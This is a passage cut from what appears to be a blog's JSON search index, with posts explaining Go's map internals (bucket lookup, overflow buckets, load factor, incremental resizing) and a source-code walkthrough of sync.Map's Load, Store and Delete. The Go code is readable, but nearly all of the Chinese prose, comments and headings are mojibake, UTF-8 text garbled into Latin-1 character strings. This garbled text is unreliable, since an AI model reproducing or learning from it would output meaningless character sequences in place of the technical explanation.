¹æ®k4å¯¹åº”çš„hashå€¼å‰8ä½å¿«é€Ÿç¡®å®šæ˜¯åœ¨è¿™ä¸ªæ¡¶çš„å“ªä¸ªä½ç½®ã€‚ï¼ˆåœ¨bmapä¸­å­˜æ”¾äº†æ¯ä¸ªkeyçš„å“ˆå¸Œå€¼å‰8ä½ï¼Œä¸€æ—¦å‘ç°å‰8ä½ä¸€è‡´ï¼Œåˆ™ä¼šæ‰§è¡Œä¸‹ä¸€æ­¥ï¼Œç†è§£æˆä¸€ç§ç¼“å­˜æªæ–½ï¼Œå¦‚æœå‰8ä½éƒ½ä¸å¯¹äº†ï¼Œåé¢å°±æ²¡æœ‰å¿…è¦æ¯”è¾ƒäº†ï¼‰ã€‚\n\nâ‘£å¯¹æ¯”keyå®Œæ•´çš„hashæ˜¯å¦åŒ¹é…ï¼Œå¦‚æœåŒ¹é…åˆ™è·å–å¯¹åº”valueã€‚\n\nâ‘¤å¦‚æœéƒ½æ²¡æœ‰æ‰¾åˆ°ï¼Œå°±å»è¿æ¥çš„ä¸‹ä¸€ä¸ªæº¢å‡ºæ¡¶ä¸­æ‰¾ã€‚\n\n### 1.2 æ•°æ®å­˜æ”¾è¿‡ç¨‹\n\nâ‘ é€šè¿‡keyçš„hashå€¼åâ€œBâ€ä½ç¡®å®šæ˜¯å“ªä¸€ä¸ªæ¡¶ï¼Œç¤ºä¾‹ä¸º5å·æ¡¶ã€‚\n\nâ‘¡ éå†å½“å‰æ¡¶ï¼Œé€šè¿‡keyçš„tophashå’Œhashå€¼ï¼Œé˜²æ­¢keyé‡å¤ï¼Œç„¶åæ‰¾åˆ°ç¬¬ä¸€ä¸ªå¯ä»¥æ’å…¥çš„ä½ç½®ï¼Œå³ç©ºä½ç½®å¤„å­˜å‚¨æ•°æ®ã€‚\n\nâ‘¢å¦‚æœå½“å‰æ¡¶å…ƒç´ å·²æ»¡ï¼Œä¼šé€šè¿‡overflowé“¾æ¥åˆ›å»ºä¸€ä¸ªæ–°çš„æ¡¶ï¼Œæ¥å­˜å‚¨æ•°æ®ã€‚\n\nå…³äºhashå†²çªï¼šå½“ä¸¤ä¸ªä¸åŒçš„ key è½åœ¨åŒä¸€ä¸ªæ¡¶ä¸­ï¼Œå°±æ˜¯å‘ç”Ÿäº†å“ˆå¸Œå†²çªã€‚å†²çªçš„è§£å†³æ‰‹æ®µæ˜¯é‡‡ç”¨é“¾è¡¨æ³•ï¼šåœ¨æ¡¶ä¸­ï¼Œä»å‰å¾€åæ‰¾åˆ°ç¬¬ä¸€ä¸ªç©ºä½è¿›è¡Œæ’å…¥ã€‚å¦‚æœ8ä¸ªkvæ»¡äº†ï¼Œé‚£ä¹ˆå½“å‰æ¡¶å°±ä¼šè¿æ¥åˆ°ä¸‹ä¸€ä¸ªæº¢å‡ºæ¡¶ï¼ˆbmapï¼‰ã€‚\n\n<img src=\"golangçš„mapå®ç°åŸç†/2cf4f9b985764026abe55bc0afe073c2~tplv-k3u1fbpfcp-zoom-in-crop-mark:1512:0:0:0.awebp\" alt=\"img\" style=\"zoom:50%;\" />\n\n# 2. æ‰©å®¹\n\n### 2.1 æ‰©å®¹å½¢å¼\n\næ‰©å®¹æœ‰ä¸¤ç§ï¼Œä¸€ç§æ˜¯ç›¸åŒå®¹é‡æ‰©å®¹ï¼Œå¦ä¸€ç§æ˜¯2å€æ‰©å®¹ã€‚\n\n##### ç›¸åŒå®¹é‡æ‰©å®¹\n\nç”±äºmapä¸­ä¸æ–­çš„putå’Œdelete keyï¼Œæ¡¶ä¸­å¯èƒ½ä¼šå‡ºç°å¾ˆå¤šæ–­æ–­ç»­ç»­çš„ç©ºä½ï¼Œè¿™äº›ç©ºä½ä¼šå¯¼è‡´è¿æ¥çš„bmapæº¢å‡ºæ¡¶å¾ˆé•¿ï¼Œå¯¼è‡´æ‰«ææ—¶é—´è¾¹é•¿ã€‚è¿™ç§æ‰©å®¹å®é™…ä¸Šæ˜¯ä¸€ç§æ•´ç†ï¼ŒæŠŠåç½®ä½çš„æ•°æ®æ•´ç†åˆ°å‰é¢ã€‚è¿™ç§æƒ…å†µä¸‹ï¼Œå…ƒç´ ä¼šå‘ç”Ÿé‡æ’ï¼Œä½†ä¸ä¼šæ¢æ¡¶ã€‚\n\n<img src=\"golangçš„mapå®ç°åŸç†/52f754efcb324bd8aa0666977649c389~tplv-k3u1fbpfcp-zoom-in-crop-mark:1512:0:0:0.awebp\" alt=\"img\" style=\"zoom:50%;\" />\n\n##### 2å€å®¹é‡æ‰©å®¹\n\nè¿™ç§2å€æ‰©å®¹æ˜¯ç”±äºå½“å‰æ¡¶æ•°ç»„ç¡®å®ä¸å¤Ÿç”¨äº†ï¼Œå‘ç”Ÿè¿™ç§æ‰©å®¹æ—¶ï¼Œå…ƒç´ ä¼šé‡æ’ï¼Œå¯èƒ½ä¼šå‘ç”Ÿæ¡¶è¿ç§»ã€‚\n\n<img src=\"golangçš„mapå®ç°åŸç†/ff55066213704c05af5b13504f03f11b~tplv-k3u1fbpfcp-zoom-in-crop-mark:1512:0:0:0.awebp\" alt=\"img\" style=\"zoom:50%;\" />\n\nå¦‚å›¾ä¸­æ‰€ç¤ºï¼Œæ‰©å®¹å‰B=2ï¼ˆ4ä¸ªï¼‰ã€‚æ‰©å®¹åB=3ï¼ˆ8ä¸ªï¼‰ã€‚\n\nå‡è®¾ä¸€å…ƒç´ keyçš„hashå€¼åä¸‰ä½ä¸º101ï¼Œé‚£ä¹ˆç”±ä¸Šæ–‡çš„ä»‹ç»å¯çŸ¥ï¼Œåœ¨æ‰©å®¹å‰ï¼Œç”±hashå€¼çš„åä¸¤ä½æ¥å†³å®šå‡ å·æ¡¶ï¼Œå³ 01 æ‰€ä»¥å…ƒç´ åœ¨1å·æ¡¶ã€‚ åœ¨æ‰©å®¹å‘ç”Ÿåï¼Œç”±hashå€¼å¾—åä¸‰ä½æ¥å†³å®šå‡ å·æ¡¶ï¼Œå³101æ‰€ä»¥å…ƒç´ ä¼šè¿ç§»åˆ°5å·æ¡¶ã€‚\n\n### 2.2 æ‰©å®¹æ¡ä»¶\n\n##### è£…è½½å› å­ > 6.5\n\nè£…è½½å› å­æ˜¯æŒ‡å½“å‰mapä¸­ï¼Œæ¯ä¸ªæ¡¶ä¸­çš„å¹³å‡å…ƒç´ ä¸ªæ•°ã€‚æ­£å¸¸æƒ…å†µä¸‹ï¼Œå¦‚æœæ²¡æœ‰æº¢å‡ºæ¡¶ï¼Œé‚£ä¹ˆä¸€ä¸ªæ¡¶ä¸­æœ€å¤šæœ‰8ä¸ªå…ƒç´ ï¼Œå½“å¹³å‡æ¯ä¸ªæ¡¶ä¸­çš„æ•°æ®è¶…è¿‡äº†6.5ä¸ªï¼Œé‚£å°±æ„å‘³ç€å½“å‰å®¹é‡è¦ä¸è¶³äº†ï¼Œå‘ç”Ÿæ‰©å®¹ã€‚\n\n##### æº¢å‡ºæ¡¶çš„æ•°é‡è¿‡å¤š\n\nå½“ B < 15 æ—¶ï¼Œå¦‚æœoverflowçš„bucketæ•°é‡è¶…è¿‡ 2^Bã€‚\n\nå½“ B >= 15 æ—¶ï¼Œoverflowçš„bucketæ•°é‡è¶…è¿‡ 2^15ã€‚\n\nç®€å•æ¥è®²ï¼Œæ–°åŠ å…¥keyçš„hashå€¼åBä½éƒ½ä¸€æ ·ï¼Œä½¿å¾—ä¸ªåˆ«æ¡¶ä¸€ç›´åœ¨æ’å…¥æ–°æ•°æ®ï¼Œè¿›è€Œå¯¼è‡´å®ƒçš„æº¢å‡ºæ¡¶é“¾æ¡è¶Šæ¥è¶Šé•¿ã€‚å¦‚æ­¤ä¸€æ¥ï¼Œå½“mapåœ¨æ“ä½œæ•°æ®æ—¶ï¼Œæ‰«æé€Ÿåº¦å°±ä¼šå˜å¾—å¾ˆæ…¢ã€‚åŠæ—¶çš„æ‰©å®¹ï¼Œå¯ä»¥å¯¹è¿™äº›å…ƒç´ è¿›è¡Œé‡æ’ï¼Œä½¿å…ƒç´ åœ¨æ¡¶çš„ä½ç½®æ›´å¹³å‡ä¸€äº›ã€‚\n\n### 2.3 æ‰©å®¹è½¬ç§»\n\n1. åœ¨æˆ‘ä»¬çš„hmapç»“æ„ä¸­æœ‰ä¸€ä¸ªoldbucketsï¼Œæ‰©å®¹åˆšå‘ç”Ÿæ—¶ï¼Œä¼šå…ˆå°†è€æ•°æ®å­˜åˆ°è¿™ä¸ªé‡Œé¢ã€‚\n2. æ¯æ¬¡å¯¹mapè¿›è¡Œåˆ æ”¹æ“ä½œæ—¶ï¼Œä¼šè§¦å‘ä»oldbucketä¸­è¿ç§»åˆ°bucketçš„æ“ä½œã€éä¸€æ¬¡æ€§ï¼Œåˆ†å¤šæ¬¡ã€‘\n3. åœ¨æ‰©å®¹æ²¡æœ‰å®Œå…¨è¿ç§»å®Œæˆä¹‹å‰ï¼Œæ¯æ¬¡getæˆ–è€…putéå†æ•°æ®æ—¶ï¼Œéƒ½ä¼šå…ˆéå†oldbucketsï¼Œç„¶åå†éå†bucketsã€‚\n\n\n\n# 3. mapç»†èŠ‚\n\n### 3.1 mapæ•°æ®ä¸å¯å–å€\n\n```bash\ntype Student struct {\n\tName string\n\tAge  int\n}\n\n// ç¼–è¯‘é”™è¯¯\nfunc f1() {\n\tm := map[int]Student{\n\t\t1: Student{Age: 15, Name: \"jack\"},\n\t\t2: Student{Age: 16, Name: \"danny\"},\n\t\t3: Student{Age: 17, Name: \"andy\"},\n\t}\n\tm[1].Name = \"JACK\"\n}\n\n// å¯ä»¥ä¿®æ”¹\nfunc f2() {\n\tm := map[int]*Student{\n\t\t1: &Student{Age: 15, Name: \"jack\"},\n\t\t2: &Student{Age: 16, Name: \"danny\"},\n\t\t3: &Student{Age: 17, Name: \"andy\"},\n\t}\n\tm[1].Name = \"JACK\"\n}\n```\n\nä¸ºä»€ä¹ˆgoä¸­è¦ç¦æ­¢å¯¹mapçš„å…ƒç´ è¿›è¡Œå–å€å‘¢ï¼Ÿè¿™æ˜¯å› ä¸ºmap ä¼šéšç€å…ƒç´ æ•°é‡çš„å¢é•¿è€Œé‡æ–°åˆ†é…æ›´å¤§çš„å†…å­˜ç©ºé—´ï¼Œä¼šå¯¼è‡´ä¹‹å‰çš„åœ°å€æ— æ•ˆã€‚\n\n### 3.2 çº¿ç¨‹ä¸å®‰å…¨\n\nåœ¨åŒä¸€æ—¶é—´ç‚¹ï¼Œä¸¤ä¸ª goroutine å¯¹åŒä¸€ä¸ªmapè¿›ï¨ˆè¯»å†™æ“ä½œæ˜¯ï¥§å®‰å…¨çš„ã€‚ä¸¾ä¸ªæ —å­ï¼š\n\næŸmapæ¡¶æ•°é‡ä¸º4ï¼Œå³B=2ã€‚æ­¤æ—¶  goroutine1æ¥æ’å…¥key1ï¼Œ goroutine2æ¥è¯»å– key2. å¯èƒ½ä¼šå‘ç”Ÿå¦‚ä¸‹è¿‡ç¨‹ï¼š\n\nâ‘  goroutine2 è®¡ç®—key2çš„hashå€¼,B=2ï¼Œå¹¶ç¡®å®šæ¡¶å·ä¸º1ã€‚\n\nâ‘¡ goroutine1æ·»åŠ key1ï¼Œè§¦å‘æ‰©å®¹æ¡ä»¶ã€‚\n\nâ‘¢ B=B+1=3, bucketsæ•°æ®è¿ç§»åˆ°oldbucketsã€‚\n\nâ‘£ goroutine2ä»æ¡¶1ä¸­éå†ï¼Œè·å–æ•°æ®å¤±è´¥ã€‚\n\nåœ¨å·¥ä½œä¸­ï¼Œå½“æˆ‘ä»¬æ¶‰åŠåˆ°å¯¹ä¸€ä¸ªmapè¿›è¡Œå¹¶å‘è¯»å†™æ—¶ï¼Œä¸€èˆ¬é‡‡ç”¨çš„åšæ³•æ˜¯é‡‡ç”¨golangä¸­è‡ªå¸¦çš„mutexé”ã€‚\n\n### 3.3 éå†æ— åº\n\nmap åœ¨æ‰©å®¹åï¼Œä¼šå‘ç”Ÿ key çš„æ¬è¿ï¼ŒåŸæ¥è½åœ¨åŒä¸€ä¸ª bucket ä¸­çš„ keyï¼Œæ¬è¿åï¼Œæœ‰äº› key å°±è¦è¿œèµ°é«˜é£äº†ï¼ˆbucket åºå·åŠ ä¸Šäº† 2^Bï¼‰ã€‚è€Œéå†çš„è¿‡ç¨‹ï¼Œå°±æ˜¯æŒ‰é¡ºåºéå† bucketï¼ŒåŒæ—¶æŒ‰é¡ºåºéå† bucket ä¸­çš„ keyã€‚æ¬è¿åï¼Œkey çš„ä½ç½®å‘ç”Ÿäº†é‡å¤§çš„å˜åŒ–ï¼Œæœ‰äº› key é£ä¸Šé«˜æï¼Œæœ‰äº› key åˆ™åŸåœ°ä¸åŠ¨ã€‚è¿™æ ·ï¼Œéå† map çš„ç»“æœå°±ä¸å¯èƒ½æŒ‰åŸæ¥çš„é¡ºåºäº†ã€‚\n\ngolangä¸ºäº†è®©ç¨‹åºå‘˜ä¸ä¾èµ–è¿™ç§ä¸å¯é çš„ä¿è¯ï¼Œå°±å¹²è„†éå†çš„æ—¶å€™åŠ å…¥éšæœºæ•°ï¼Œç„¶åä¸ç®¡ä»€ä¹ˆæ—¶å€™éå†ï¼Œé¡ºåºéƒ½æ˜¯ä¸ä¿è¯çš„ã€‚\n\n### 3.4 å¤´è„‘é£æš´\n\n+ hmapï¼ˆhashmapï¼‰ç»´æŠ¤ä¸€ä¸ªæ¡¶æ•°ç»„ï¼Œæ•°ç»„çš„æ¯ä¸ªå…ƒç´ æ˜¯ä¸€ä¸ªbmapã€‚\n+ æ¯ä¸ªæ¡¶æœ‰ 8ä¸ªkv å¯¹ï¼Œå¤šäº†å°±ç”¨å¢åŠ ä¸€ä¸ªæº¢å‡ºæ¡¶ã€‚bmapå­˜ç€key valueï¼Œå’Œä¸‹ä¸€ä¸ªæº¢å‡ºæ¡¶çš„åœ°å€ã€‚\n+ åŸºæœ¬æ•°æ®ç»“æ„æ˜¯ hashæ•°ç»„+æ¡¶å†…çš„key-valueæ•°ç»„+æº¢å‡ºçš„æ¡¶é“¾è¡¨ã€‚\n+ æ‰©å®¹æœ‰å¯èƒ½ä¼šè¿ç§»æ¡¶ã€‚\n\n# 4. å‚è€ƒèµ„æ–™\n\n+ https://juejin.cn/post/7029679896183963678\n+ https://segmentfault.com/a/1190000039101378\n","tags":["golang"],"categories":["2_golangåº•å±‚"]},{"title":"golangçš„sync.Mapå®ç°åŸç†","url":"%2Fp%2F22d609c9.html","content":"\nmapçš„è¯»å†™åˆ é™¤éƒ½ä¸æ˜¯åŸå­æ“ä½œï¼Œå› æ­¤éœ€è¦æ§åˆ¶å¹¶å‘è®¿é—®ï¼Œè€ŒGoçš„åŸç”Ÿmapä¸æ”¯æŒå¹¶å‘è¯»å†™ï¼›\n\nGoåœ¨1.9çš„ç‰ˆæœ¬ä¸­æ–°å¢äº†sync.Mapçš„æ•°æ®ç»“æ„ï¼Œä¸¤ä¸ªmapå®ç° è¯»å†™åˆ†ç¦»ï¼Œé€‚ç”¨äºè¯»å¤šå†™å°‘çš„åœºæ™¯ã€‚\n\n<!-- more -->\n\n# 1. ä»‹ç»\n\n```go\nvar syncMap sync.Map\n\n// æ·»åŠ æ•°æ®\nsyncMap.Store(1, \"test-1\")\nsyncMap.Store(2, \"test-2\")\nsyncMap.Store(3, \"test-3\")\n\n// è¯»å–æ•°æ®\nv, ok := syncMap.Load(1)\nif !ok {\n        fmt.Println(\"æ•°æ®ä¸å­˜åœ¨\")\n        return\n}\nfmt.Println(v)\n\n// LoadOrStoreæ–¹æ³•ç”¨äºä¸å­˜åœ¨åˆ™æ·»åŠ ï¼Œå­˜åœ¨åˆ™è¿”å›\nfmt.Println(syncMap.LoadOrStore(1, \"www.liuvv.com\"))\n\n// åˆ é™¤æ•°æ®\nsyncMap.Delete(1)\n\n// å¾ªç¯éå†è¯»å–æ•°æ®è·å–é•¿åº¦\nlen := 0\nsyncMap.Range(func(k, v interface{}) bool {\n        len++\n        fmt.Println(k, v)\n        return true\n})\nfmt.Println(\"syncMapé•¿åº¦:\", len)\n```\n\n### 1.1 åŸç†\n\nsync.Mapåº•å±‚ä½¿ç”¨äº†ä¸¤ä¸ªåŸç”Ÿmapï¼Œä¸€ä¸ªå«readï¼Œä»…ç”¨äºè¯»ï¼›ä¸€ä¸ªå«dirtyï¼Œç”¨äºåœ¨ç‰¹å®šæƒ…å†µä¸‹å­˜å‚¨æœ€æ–°å†™å…¥çš„key-valueæ•°æ®ã€‚\n\n<img src=\"golangçš„sync_mapå®ç°åŸç†/1cc2d5ec1bc8422a9fdc912ba5a69d66.png\" alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" style=\"zoom: 33%;\" />\n\n**sync.Map çš„å®ç°åŸç†å¯æ¦‚æ‹¬ä¸ºï¼š**\n\n1. é€šè¿‡ read å’Œ dirty ä¸¤ä¸ªå­—æ®µå®ç°æ•°æ®çš„è¯»å†™åˆ†ç¦»ï¼Œè¯»çš„æ•°æ®å­˜åœ¨åªè¯»å­—æ®µ read ä¸Šï¼Œå°†æœ€æ–°å†™å…¥çš„æ•°æ®åˆ™å­˜åœ¨ dirty å­—æ®µä¸Šã€‚\n2. è¯»å–æ—¶ä¼šå…ˆæŸ¥è¯¢ readï¼Œä¸å­˜åœ¨å†æŸ¥è¯¢ dirtyï¼Œå†™å…¥æ—¶åˆ™åªå†™å…¥ dirtyã€‚\n3. è¯»å– read å¹¶ä¸éœ€è¦åŠ é”ï¼Œè€Œè¯»æˆ–å†™ dirty åˆ™éœ€è¦åŠ é”ã€‚\n4. å¦å¤–æœ‰ misses å­—æ®µæ¥ç»Ÿè®¡ read è¢«ç©¿é€çš„æ¬¡æ•°ï¼ˆè¢«ç©¿é€æŒ‡éœ€è¦è¯» dirty çš„æƒ…å†µï¼‰ï¼Œè¶…è¿‡ä¸€å®šæ¬¡æ•°åˆ™å°† dirty æ•°æ®æ›´æ–°åˆ° read ä¸­ï¼ˆè§¦å‘æ¡ä»¶ï¼šmisses=len(dirty)ï¼‰\n\n![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](golangçš„sync_mapå®ç°åŸç†/a98832789cd34c9db0cc1facf134deb1.png)\n\n### 1.2 ä¼˜ç¼ºç‚¹\n\n- ä¼˜ç‚¹ï¼šGoå®˜æ–¹æ‰€å‡ºï¼›é€šè¿‡è¯»å†™åˆ†ç¦»ï¼Œé™ä½é”æ—¶é—´æ¥æé«˜æ•ˆç‡ï¼›\n- ç¼ºç‚¹ï¼šä¸é€‚ç”¨äºå¤§é‡å†™çš„åœºæ™¯ï¼Œè¿™æ ·ä¼šå¯¼è‡´ read map è¯»ä¸åˆ°æ•°æ®è€Œè¿›ä¸€æ­¥åŠ é”è¯»å–ï¼ŒåŒæ—¶dirty mapä¹Ÿä¼šä¸€ç›´æ™‹å‡ä¸ºread mapï¼Œæ•´ä½“æ€§èƒ½è¾ƒå·®ï¼Œç”šè‡³æ²¡æœ‰å•çº¯çš„ map+metuxé«˜ã€‚\n- é€‚ç”¨åœºæ™¯ï¼šè¯»å¤šå†™å°‘çš„åœºæ™¯ã€‚\n\n# 2. æºç åˆ†æ\n\n### 2.1 æ•°æ®ç»“æ„\n\n```go\n// sync.Mapçš„æ ¸å¿ƒæ•°æ®ç»“æ„\ntype Map struct {\n    mu Mutex                          // å¯¹ dirty åŠ é”ä¿æŠ¤ï¼Œçº¿ç¨‹å®‰å…¨\n    read atomic.Value                 // readOnly åªè¯»çš„ mapï¼Œå……å½“ç¼“å­˜å±‚\n    dirty map[interface{}]*entry     // è´Ÿè´£å†™æ“ä½œçš„ mapï¼Œå½“misses = len(dirty)æ—¶ï¼Œå°†å…¶èµ‹å€¼ç»™read\n    misses int                        // æœªå‘½ä¸­ read æ—¶çš„ç´¯åŠ è®¡æ•°ï¼Œæ¯æ¬¡+1\n}\n\n// ä¸Šé¢readå­—æ®µçš„æ•°æ®ç»“æ„\ntype readOnly struct {\n    m  map[interface{}]*entry \n    amended bool // Map.dirtyçš„æ•°æ®å’Œè¿™é‡Œreadä¸­ m çš„æ•°æ®ä¸ä¸€æ ·æ—¶ï¼Œä¸ºtrue\n}\n\n// ä¸Šé¢må­—æ®µä¸­çš„entryç±»å‹\ntype entry struct {\n    // å¯è§valueæ˜¯ä¸ªæŒ‡é’ˆç±»å‹ï¼Œè™½ç„¶readå’Œdirtyå­˜åœ¨å†—ä½™æƒ…å†µï¼ˆamended=falseï¼‰ï¼Œä½†æ˜¯ç”±äºæ˜¯æŒ‡é’ˆç±»å‹ï¼Œå­˜å‚¨çš„ç©ºé—´åº”è¯¥ä¸æ˜¯é—®é¢˜\n    p unsafe.Pointer // *interface{}\n}\n```\n\n### 2.2 load æ“ä½œ\n\n```go\nfunc (m *Map) Load(key interface{}) (value interface{}, ok bool) {\n    // å› readåªè¯»ï¼Œçº¿ç¨‹å®‰å…¨ï¼Œä¼˜å…ˆè¯»å–\n    read, _ := m.read.Load().(readOnly)\n    e, ok := read.m[key]\n    \n    // å¦‚æœreadæ²¡æœ‰ï¼Œå¹¶ä¸”dirtyæœ‰æ–°æ•°æ®ï¼Œé‚£ä¹ˆå»dirtyä¸­æŸ¥æ‰¾ï¼ˆread.amended=trueï¼šdirtyå’Œreadæ•°æ®ä¸ä¸€è‡´ï¼‰\n    if !ok && read.amended {\n        m.mu.Lock()\n        // åŒé‡æ£€æŸ¥ï¼ˆåŸå› æ˜¯å‰æ–‡çš„ifåˆ¤æ–­å’ŒåŠ é”éåŸå­çš„ï¼Œå®³æ€•è¿™ä¸­é—´å‘ç”Ÿæ•…äº‹ï¼‰\n        read, _ = m.read.Load().(readOnly)\n        e, ok = read.m[key]\n        \n        // å¦‚æœreadä¸­è¿˜æ˜¯ä¸å­˜åœ¨ï¼Œå¹¶ä¸”dirtyä¸­æœ‰æ–°æ•°æ®\n        if !ok && read.amended {\n            e, ok = m.dirty[key]\n            // mè®¡æ•°+1\n            m.missLocked()\n        }\n        \n        m.mu.Unlock()\n    }\n    \n    // !ok && read.amended=falseï¼šdirtyå’Œreadæ•°æ®æ˜¯ä¸€è‡´çš„ï¼Œread å’Œ dirty ä¸­éƒ½ä¸å­˜åœ¨ï¼Œè¿”å›nil\n    if !ok {\n        return nil, false\n    }\n    \n    // ok && read.amended=trueï¼šdirtyå’Œreadæ•°æ®ä¸ä¸€è‡´ï¼Œdirtyå­˜åœ¨ä½†readä¸å­˜åœ¨è¯¥keyï¼Œç›´æ¥è¿”å›dirtyä¸­æ•°æ®\n    return e.load()\n}\n\nfunc (m *Map) missLocked() {\n    m.misses++\n    if m.misses < len(m.dirty) {\n        return\n    }\n    \n    // å°†dirtyç½®ç»™readï¼Œå› ä¸ºç©¿é€æ¦‚ç‡å¤ªå¤§äº†(åŸå­æ“ä½œï¼Œè€—æ—¶å¾ˆå°)\n    m.read.Store(readOnly{m: m.dirty})\n    m.dirty = nil\n    m.misses = 0\n}\n\n```\n\n<img src=\"golangçš„sync_mapå®ç°åŸç†/20f35453c3ed4212bc154ac440624464.png\" alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" style=\"zoom:70%;\" />\n\n\n\n- å› ä¸ºå†™æ“ä½œä»…é’ˆå¯¹dirtyï¼ˆè´Ÿè´£å†™æ“ä½œçš„mapï¼‰ï¼Œæ‰€ä»¥dirtyæ˜¯åŒ…å«readçš„ï¼Œæœ€æ–°ä¸”å…¨é‡çš„æ•°æ®ã€‚\n\n### 2.3 store æ“ä½œ\n\n```go\nfunc (m *Map) Store(key, value interface{}) {\n    // å¦‚æœm.readå­˜åœ¨è¿™ä¸ªkeyï¼Œå¹¶ä¸”æ²¡æœ‰è¢«æ ‡è®°åˆ é™¤ï¼Œåˆ™å°è¯•æ›´æ–°ã€‚\n    read, _ := m.read.Load().(readOnly)\n    if e, ok := read.m[key]; ok && e.tryStore(&value) {\n        return\n    }\n    \n    // å¦‚æœreadä¸å­˜åœ¨æˆ–è€…å·²ç»è¢«æ ‡è®°åˆ é™¤\n    m.mu.Lock()\n    read, _ = m.read.Load().(readOnly)\n   \n    if e, ok := read.m[key]; ok { // read å­˜åœ¨è¯¥key\n    // å¦‚æœreadå€¼åŸŸä¸­entryå·²åˆ é™¤ä¸”è¢«æ ‡è®°ä¸ºexpungeï¼Œåˆ™è¡¨æ˜dirtyæ²¡æœ‰keyï¼Œå¯æ·»åŠ å…¥dirtyï¼Œå¹¶æ›´æ–°entry\n        if e.unexpungeLocked() { \n            // åŠ å…¥dirtyä¸­ï¼Œè¿™é‡Œæ˜¯æŒ‡é’ˆ\n            m.dirty[key] = e\n        }\n        // æ›´æ–°valueå€¼\n        e.storeLocked(&value) \n        \n    } else if e, ok := m.dirty[key]; ok { // dirty å­˜åœ¨è¯¥ keyï¼Œæ›´æ–°\n        e.storeLocked(&value)\n        \n    } else { // read å’Œ dirtyéƒ½æ²¡æœ‰\n        // å¦‚æœreadä¸dirtyç›¸åŒï¼Œåˆ™è§¦å‘ä¸€æ¬¡dirtyåˆ·æ–°ï¼ˆå› ä¸ºå½“readé‡ç½®çš„æ—¶å€™ï¼Œdirtyå·²ç½®ä¸º niläº†ï¼‰\n        if !read.amended { \n            // å°†readä¸­æœªåˆ é™¤çš„æ•°æ®åŠ å…¥åˆ°dirtyä¸­\n            m.dirtyLocked() \n            // amendedæ ‡è®°ä¸ºreadä¸dirtyä¸ç›¸åŒï¼Œå› ä¸ºåé¢å³å°†åŠ å…¥æ–°æ•°æ®ã€‚\n            m.read.Store(readOnly{m: read.m, amended: true})\n        }\n        m.dirty[key] = newEntry(value) \n    }\n    m.mu.Unlock()\n}\n\n// å°†readä¸­æœªåˆ é™¤çš„æ•°æ®åŠ å…¥åˆ° dirtyä¸­\nfunc (m *Map) dirtyLocked() {\n    if m.dirty != nil {\n        return\n    }\n    \n    read, _ := m.read.Load().(readOnly)\n    m.dirty = make(map[interface{}]*entry, len(read.m))\n    \n    // éå†readã€‚\n    for k, e := range read.m {\n        // é€šè¿‡æ­¤æ¬¡æ“ä½œï¼Œdirtyä¸­çš„å…ƒç´ éƒ½æ˜¯æœªè¢«åˆ é™¤çš„ï¼Œå¯è§æ ‡è®°ä¸ºexpungedçš„å…ƒç´ ä¸åœ¨dirtyä¸­ï¼ï¼ï¼\n        if !e.tryExpungeLocked() {\n            m.dirty[k] = e\n        }\n    }\n}\n\n// åˆ¤æ–­entryæ˜¯å¦è¢«æ ‡è®°åˆ é™¤ï¼Œå¹¶ä¸”å°†æ ‡è®°ä¸ºnilçš„entryæ›´æ–°æ ‡è®°ä¸ºexpunge\nfunc (e *entry) tryExpungeLocked() (isExpunged bool) {\n    p := atomic.LoadPointer(&e.p)\n    \n    for p == nil {\n        // å°†å·²ç»åˆ é™¤æ ‡è®°ä¸ºnilçš„æ•°æ®æ ‡è®°ä¸ºexpunged\n        if atomic.CompareAndSwapPointer(&e.p, nil, expunged) {\n            return true\n        }\n        p = atomic.LoadPointer(&e.p)\n    }\n    return p == expunged\n}\n\n// å¯¹entryå°è¯•æ›´æ–° ï¼ˆåŸå­casæ“ä½œï¼‰\nfunc (e *entry) tryStore(i *interface{}) bool {\n    p := atomic.LoadPointer(&e.p)\n    if p == expunged {\n        return false\n    }\n    for {\n        if atomic.CompareAndSwapPointer(&e.p, p, unsafe.Pointer(i)) {\n            return true\n        }\n        p = atomic.LoadPointer(&e.p)\n        if p == expunged {\n            return false\n        }\n    }\n}\n\n// readé‡Œ å°†æ ‡è®°ä¸ºexpungeçš„æ›´æ–°ä¸ºnil\nfunc (e *entry) unexpungeLocked() (wasExpunged bool) {\n    return atomic.CompareAndSwapPointer(&e.p, expunged, nil)\n}\n\n// æ›´æ–°entry\nfunc (e *entry) storeLocked(i *interface{}) {\n    atomic.StorePointer(&e.p, unsafe.Pointer(i))\n}\n```\n\n<img src=\"golangçš„sync_mapå®ç°åŸç†/9582a20c2f0146c8ad42df8d989f085b.png\" alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" style=\"zoom:70%;\" />\n\n### 2.4 delete æ“ä½œ\n\n```go\nfunc (m *Map) Delete(key interface{}) {\n    // è¯»å‡ºreadï¼Œæ–­è¨€ä¸ºreadOnlyç±»å‹\n    read, _ := m.read.Load().(readOnly)\n    e, ok := read.m[key]\n    // å¦‚æœreadä¸­æ²¡æœ‰ï¼Œå¹¶ä¸”dirtyä¸­æœ‰æ–°å…ƒç´ ï¼Œé‚£ä¹ˆå°±å»dirtyä¸­å»æ‰¾ã€‚è¿™é‡Œç”¨åˆ°äº†amendedï¼Œå½“readä¸dirtyä¸åŒæ—¶ä¸ºtrueï¼Œè¯´æ˜dirtyä¸­æœ‰readæ²¡æœ‰çš„æ•°æ®ã€‚\n    \n    if !ok && read.amended {\n        m.mu.Lock()\n        // å†æ£€æŸ¥ä¸€æ¬¡ï¼Œå› ä¸ºå‰æ–‡çš„åˆ¤æ–­å’Œé”ä¸æ˜¯åŸå­æ“ä½œï¼Œé˜²æ­¢æœŸé—´å‘ç”Ÿäº†å˜åŒ–ã€‚\n        read, _ = m.read.Load().(readOnly)\n        e, ok = read.m[key]\n        \n        if !ok && read.amended {\n            // ç›´æ¥åˆ é™¤\n            delete(m.dirty, key)\n        }\n        m.mu.Unlock()\n    }\n    \n    if ok {\n    // å¦‚æœreadä¸­å­˜åœ¨è¯¥keyï¼Œåˆ™å°†è¯¥value èµ‹å€¼nilï¼ˆé‡‡ç”¨æ ‡è®°çš„æ–¹å¼åˆ é™¤ï¼ï¼‰\n        e.delete()\n    }\n}\n\nfunc (e *entry) delete() (hadValue bool) {\n    for {\n        // å†æ¬¡åŠ 